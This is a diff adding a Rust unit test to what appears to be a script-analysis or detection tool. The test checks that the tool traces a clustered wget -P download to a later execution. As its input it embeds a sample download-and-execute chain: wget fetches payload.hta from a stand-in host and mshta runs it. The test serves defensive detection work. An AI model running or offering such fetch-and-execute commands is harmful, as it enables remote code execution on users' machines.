@@ -8251,6 +8251,41 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn wget_short_option_cluster_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget -qPC:\Temp https://wget-cluster-prefix-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_prefix = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://wget-cluster-prefix-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp"#
+            )
+        });
+        assert!(
+            has_download_prefix,
+            "wget clustered -P did not record destination prefix: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-cluster-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve clustered wget -P download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wget_schemeless_domain_path_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
